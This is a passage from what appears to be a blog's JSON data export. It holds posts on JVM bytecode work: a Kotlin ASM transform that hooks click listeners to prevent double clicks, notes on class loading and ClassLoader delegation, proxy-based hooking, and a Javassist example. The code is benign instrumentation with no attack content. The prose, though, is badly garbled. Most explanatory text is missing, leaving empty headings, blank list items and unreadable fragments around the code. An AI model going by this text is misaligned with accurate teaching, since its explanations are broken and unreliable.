punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token keyword\">val</span> argumentTypes <span class=\"token operator\">=</span> Type<span class=\"token punctuation\">.</span><span class=\"token function\">getArgumentTypes</span><span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span>desc<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">val</span> viewArgumentIndex <span class=\"token operator\">=</span> argumentTypes<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOfFirst</span> <span class=\"token punctuation\">&#123;</span>\n                            it<span class=\"token punctuation\">.</span>descriptor <span class=\"token operator\">==</span> ViewDescriptor\n                        <span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">?:</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n                        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>viewArgumentIndex <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                            <span class=\"token keyword\">val</span> instructions <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span>instructions\n                            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>instructions <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">&amp;&amp;</span> instructions<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                                <span class=\"token keyword\">val</span> list <span class=\"token operator\">=</span> <span class=\"token function\">InsnList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n                                    <span class=\"token function\">VarInsnNode</span><span class=\"token punctuation\">(</span>\n                                        Opcodes<span class=\"token punctuation\">.</span>ALOAD<span class=\"token punctuation\">,</span> <span class=\"token function\">getVisitPosition</span><span class=\"token punctuation\">(</span>\n                                            argumentTypes<span class=\"token punctuation\">,</span>\n                                            viewArgumentIndex<span class=\"token punctuation\">,</span>\n                                            methodNode<span class=\"token punctuation\">.</span>isStatic\n                                        <span class=\"token punctuation\">)</span>\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n                                    <span class=\"token function\">MethodInsnNode</span><span class=\"token punctuation\">(</span>\n                                        Opcodes<span class=\"token punctuation\">.</span>INVOKESTATIC<span class=\"token punctuation\">,</span>\n                                        config<span class=\"token punctuation\">.</span>formatDoubleCheckClass<span class=\"token punctuation\">,</span>\n                                        config<span class=\"token punctuation\">.</span>doubleCheckMethodName<span class=\"token punctuation\">,</span>\n                                        config<span class=\"token punctuation\">.</span>doubleCheckMethodDescriptor\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">)</span>\n                                <span class=\"token keyword\">val</span> labelNode <span class=\"token operator\">=</span> <span class=\"token function\">LabelNode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token function\">JumpInsnNode</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>IFNE<span class=\"token punctuation\">,</span> labelNode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token function\">InsnNode</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>RETURN<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>labelNode<span class=\"token punctuation\">)</span>\n                                instructions<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>list<span class=\"token punctuation\">)</span>\n                            <span class=\"token punctuation\">&#125;</span>\n                        <span class=\"token punctuation\">&#125;</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span>ClassWriter<span class=\"token punctuation\">.</span>COMPUTE_MAXS<span class=\"token punctuation\">)</span>\n                classNode<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">return</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> byteArray\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> ClassNode<span class=\"token punctuation\">.</span><span class=\"token function\">isHookPoint</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">,</span> methodNode<span class=\"token operator\">:</span> MethodNode<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> myInterfaces <span class=\"token operator\">=</span> interfaces\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>myInterfaces<span class=\"token punctuation\">.</span><span class=\"token function\">isNullOrEmpty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">val</span> extraHookMethodList <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>hookPointList\n        extraHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>myInterfaces<span class=\"token punctuation\">.</span><span class=\"token function\">contains</span><span class=\"token punctuation\">(</span>it<span class=\"token punctuation\">.</span>interfaceName<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> methodNode<span class=\"token punctuation\">.</span>nameWithDesc <span class=\"token operator\">==</span> it<span class=\"token punctuation\">.</span>methodSign<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">findHookPointLambda</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>InvokeDynamicInsnNode<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> onClickListenerLambda <span class=\"token operator\">=</span> findLambda <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">val</span> nodeName <span class=\"token operator\">=</span> it<span class=\"token punctuation\">.</span>name\n            <span class=\"token keyword\">val</span> nodeDesc <span class=\"token operator\">=</span> it<span class=\"token punctuation\">.</span>desc\n            <span class=\"token keyword\">val</span> find <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>hookPointList<span class=\"token punctuation\">.</span><span class=\"token function\">find</span> <span class=\"token punctuation\">&#123;</span> point <span class=\"token operator\">-></span>\n                nodeName <span class=\"token operator\">==</span> point<span class=\"token punctuation\">.</span>methodName <span class=\"token operator\">&amp;&amp;</span> nodeDesc<span class=\"token punctuation\">.</span><span class=\"token function\">endsWith</span><span class=\"token punctuation\">(</span>point<span class=\"token punctuation\">.</span>interfaceSignSuffix<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">return</span><span class=\"token label symbol\">@findLambda</span> find <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> onClickListenerLambda\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">getInputTypes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Set<span class=\"token operator\">&lt;</span>QualifiedContent<span class=\"token punctuation\">.</span>ContentType<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> TransformManager<span class=\"token punctuation\">.</span>CONTENT_CLASS\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">getScopes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> MutableSet<span class=\"token operator\">&lt;</span><span class=\"token keyword\">in</span> QualifiedContent<span class=\"token punctuation\">.</span>Scope<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">mutableSetOf</span><span class=\"token punctuation\">(</span>\n            QualifiedContent<span class=\"token punctuation\">.</span>Scope<span class=\"token punctuation\">.</span>PROJECT<span class=\"token punctuation\">,</span>\n            QualifiedContent<span class=\"token punctuation\">.</span>Scope<span class=\"token punctuation\">.</span>SUB_PROJECTS<span class=\"token punctuation\">,</span>\n<span class=\"token comment\">//            QualifiedContent.Scope.EXTERNAL_LIBRARIES</span>\n        <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>BaseTransform</code>class<code>modifierClass(byteArray: ByteArray): ByteArray</code>asm</p>\n<p></p>\n<ul>\n<li>hookButterKnifeonClickView#setOnClickListener</li>\n<li>hook</li>\n</ul>\n<blockquote>\n<p></p>\n</blockquote>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/13202633-3cb11d1712a9efc9.webp\" alt=\"13202633-3cb11d1712a9efc9\"></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h4 id=\"-Loading\"><a href=\"#-Loading\" class=\"headerlink\" title=\" Loading\"></a> Loading</h4><blockquote>\n<p>io</p>\n<p></p>\n<ol>\n<li></li>\n<li></li>\n<li>java.lang.Class</li>\n</ol>\n<p></p>\n</blockquote>\n<h4 id=\"-Verification\"><a href=\"#-Verification\" class=\"headerlink\" title=\" Verification\"></a> Verification</h4><blockquote>\n<p>Class</p>\n<ol>\n<li></li>\n<li><em><strong></strong></em></li>\n<li></li>\n<li></li>\n</ol>\n</blockquote>\n<h4 id=\"-Preparation\"><a href=\"#-Preparation\" class=\"headerlink\" title=\" Preparation\"></a> Preparation</h4><blockquote>\n<p></p>\n</blockquote>\n<p></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> value <span class=\"token operator\">=</span> <span class=\"token number\">12345</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>value5value0</p>\n<h4 id=\"-Resolution\"><a href=\"#-Resolution\" class=\"headerlink\" title=\" Resolution\"></a> Resolution</h4><blockquote>\n<p></p>\n<ul>\n<li>JavaClass</li>\n<li></li>\n</ul>\n<p></p>\n<ul>\n<li><p></p>\n</li>\n<li><p></p>\n</li>\n<li><p></p>\n</li>\n<li><p></p>\n</li>\n</ul>\n</blockquote>\n<h4 id=\"-Initialization\"><a href=\"#-Initialization\" class=\"headerlink\" title=\" Initialization\"></a> Initialization</h4><blockquote>\n<p><client><client><client><client><client>()</p>\n<p>java</p>\n<ul>\n<li><p>newfinal</p>\n</li>\n<li><p></p>\n</li>\n<li><p>java.lang.reflect</p>\n</li>\n<li><p>main</p>\n</li>\n<li><p>jdk 1.7java.lang.invoke.MethodHandle REF_getStaticREF_putStaticREF_invokeStatic</p>\n</li>\n</ul>\n</blockquote>\n<h4 id=\"-Unloading\"><a href=\"#-Unloading\" class=\"headerlink\" title=\" Unloading\"></a> Unloading</h4><blockquote>\n<p>ClassclassLoadergc rootsgc rootsgcjvm(JavaAgent</p>\n</blockquote>\n<h3 id=\"-ClassLoader\"><a href=\"#-ClassLoader\" class=\"headerlink\" title=\" (ClassLoader)\"></a> (ClassLoader)</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>JVM  ClassLoader ClassLoader  jar </p>\n<p>JVM  ClassLoader BootstrapClassLoaderExtensionClassLoader  AppClassLoader</p>\n<p>BootstrapClassLoader  JVM  JAVA_HOME&#x2F;lib&#x2F;rt.jar  java.xxx.*  java.util.*java.io.*java.nio.<em>java.lang.</em>  ClassLoader  C </p>\n<p>ExtensionClassLoader  JVM  swing  js xml   javax  jar  JAVA_HOME&#x2F;lib&#x2F;ext&#x2F;*.jar  jar </p>\n<p>AppClassLoader  Classpath  jar  jar </p>\n<p> jar  classjdk  URLClassLoader URLClassLoader URLClassLoader ExtensionClassLoader  AppClassLoader  URLClassLoader </p>\n<p>AppClassLoader  ClassLoader  getSystemClassLoader()  main  AppClassLoader</p>\n<h4 id=\"ClassLoader-\"><a href=\"#ClassLoader-\" class=\"headerlink\" title=\"ClassLoader \"></a>ClassLoader </h4><p> ClassLoader  Class  ClassLoader  Class  Class  Class  classLoader </p>\n<p> ClassLoader  main  ClassLoader  AppClassLoader</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<p><strong>Java</strong>java.lang.Objectrt.jarBootstrap ClassLoaderObjectjava.lang.ObjectClassPathObjectrt.jarJava</p>\n<p><img src=\"https://img-blog.csdn.net/20160506184936657\" alt=\"\"></p>\n<p><strong></strong></p>\n<p>java.lang.ClassLoaderloadClass()loadClass()ClassNotFoundExceptionfindClass()</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">protected</span> <span class=\"token keyword\">synchronized</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span><span class=\"token keyword\">boolean</span> resolve<span class=\"token punctuation\">)</span><span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassNotFoundException</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">//check the class has been loaded or not</span>\n    <span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> <span class=\"token function\">findLoadedClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>parent <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                c <span class=\"token operator\">=</span> parent<span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n                c <span class=\"token operator\">=</span> <span class=\"token function\">findBootstrapClassOrNull</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassNotFoundException</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">//if throws the exception ,the father can not complete the load</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            c <span class=\"token operator\">=</span> <span class=\"token function\">findClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">resolveClass</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>JavaJDKThread Context ClassLoaderJava</p>\n<h2 id=\"Hook\"><a href=\"#Hook\" class=\"headerlink\" title=\"Hook\"></a>Hook</h2><h3 id=\"Hook\"><a href=\"#Hook\" class=\"headerlink\" title=\"Hook\"></a>Hook</h3><p>hook<strong>hook</strong></p>\n<h3 id=\"Hook\"><a href=\"#Hook\" class=\"headerlink\" title=\"Hook\"></a>Hook</h3><p><img src=\"https://pic2.zhimg.com/80/v2-58f3800446ebb35fa8f38de1449a6af5_1440w.jpg\" alt=\"img\"></p>\n<p>&#x2F;Hook</p>\n<p>:</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">object</span> ServiceHolder <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> apiService<span class=\"token operator\">:</span> IWebServiceRepository <span class=\"token operator\">=</span> <span class=\"token function\">WebServiceRepository</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// WebServiceRepository</span>\n<span class=\"token keyword\">class</span> WebServiceRepository <span class=\"token operator\">:</span> IWebServiceRepository <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> BASE_URL <span class=\"token operator\">=</span> <span class=\"token string\">\"https://api.bifrost.kim\"</span>\n    \n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">getJsonData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Data <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// ...</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<p>apiService</p>\n<p>InvocationHandler</p>\n<p>asm</p>\n<h3 id=\"LSposedHook-\"><a href=\"#LSposedHook-\" class=\"headerlink\" title=\"LSposedHook ()\"></a>LSposedHook ()</h3><blockquote>\n<p> </p>\n</blockquote>\n"},{"title":"Javassist","date":"2021-11-07T15:08:07.000Z","author":"","hide":false,"summary":"javassist","_content":"\n: setOp\n\nJavassistjavassistsetopbjavassistInteger...surf the internetasmasmasmjavassist\n\n\n\n```kotlin\nfun main() {\n    javassistEdit()\n}\n\nfun javassistEdit() {\n    // ctClass,KotlinKt\n    val ctClass = ClassPool.getDefault().get(\"kim.bifrost.coldrain.partice.TestClass\")\n    // ctClass\n    val ctMethod = ctClass.getDeclaredMethod(\"test\")\n    // \n    ctMethod.setBody(\"{ System.out.println(\\\"\\\"); }\")\n    // \n    ctMethod.insertBefore(\"\"\"\n        System.out.println(\"\");\n        \"\"\")\n    // \n    ctMethod.insertAfter(\"\"\"\n        System.out.println(\"\");\n        \"\"\")\n    // cflow\n    ctMethod.useCflow(\"test\")\n    // test\n    ctMethod.insertBefore(\"if ($\"+ \"cflow(test) == 0)\" +\n            \" System.out.println(\\\"test \\\");\")\n    // newInstancecast,\n    (ctClass.toClass().newInstance() as TestInterface).test()\n}\n\nclass TestClass : TestInterface {\n    override fun test() {\n        println(\"1\")\n    }\n}\n\ninterface TestInterface {\n    fun test()\n}\n```\n\n:\n\n```\ntest \n\n\n\n```\n\nTestClass\n\nctClass\n\n setOp ","source":"_posts/try-javassist.md","raw":"---\ntitle: Javassist\ndate: 2021-11-7 23:08:07\nauthor: \nhide: false\nsummary: javassist\ncategories: \ntags:\n  - \n  - Kotlin\n  - Java\n---\n\n: setOp\n\nJavassistjavassistsetopbjavassistInteger...surf the internetasmasmasmjavassist\n\n\n\n```kotlin\nfun main() {\n    javassistEdit()\n}\n\nfun javassistEdit() {\n    // ctClass,KotlinKt\n    val ctClass = ClassPool.getDefault().get(\"kim.bifrost.coldrain.partice.TestClass\")\n    // ctClass\n    val ctMethod = ctClass.getDeclaredMethod(\"test\")\n    // \n    ctMethod.setBody(\"{ System.out.println(\\\"\\\"); }\")\n    // \n    ctMethod.insertBefore(\"\"\"\n        System.out.println(\"\");\n        \"\"\")\n    // \n    ctMethod.insertAfter(\"\"\"\n        System.out.println(\"\");\n        \"\"\")\n    // cflow\n    ctMethod.useCflow(\"test\")\n    // test\n    ctMethod.insertBefore(\"if ($\"+ \"cflow(test) == 0)\" +\n            \" System.out.println(\\\"test \\\");\")\n    // newInstancecast,\n    (ctClass.toClass().newInstance() as TestInterface).test()\n}\n\nclass TestClass : TestInterface {\n    override fun test() {\n        println(\"1\")\n    }\n}\n\ninterface TestInterface {\n    fun test()\n}\n```\n\n:\n\n```\ntest \n\n\n\n```\n\nTestClass\n\nctClass\n\n setOp ","slug":"try-javassist","published":1,"updated":"2022-12-12T15:53:30.624Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23ju0002usfkla1pfcl4g","content":"<p>: setOp</p>\n<p>JavassistjavassistsetopbjavassistIntegersurf the internetasmasmasmjavassist</p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">javassistEdit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">javassistEdit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// ctClass,KotlinKt</span>\n    <span class=\"token keyword\">val</span> ctClass <span class=\"token operator\">=</span> ClassPool<span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"kim.bifrost.coldrain.partice.TestClass\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// ctClass</span>\n    <span class=\"token keyword\">val</span> ctMethod <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{ System.out.println(\\\"\\\"); }\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">insertBefore</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"\n        System.out.println(\"\");\n        \"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">insertAfter</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"\n        System.out.println(\"\");\n        \"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// cflow</span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">useCflow</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// test</span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">insertBefore</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"if ($\"</span><span class=\"token operator\">+</span> <span class=\"token string\">\"cflow(test) == 0)\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\" System.out.println(\\\"test \\\");\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// newInstancecast,</span>\n    <span class=\"token punctuation\">(</span>ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">toClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> TestInterface<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> TestClass <span class=\"token operator\">:</span> TestInterface <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">interface</span> TestInterface <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">test \n\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>TestClass</p>\n<p>ctClass</p>\n<p> setOp </p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep 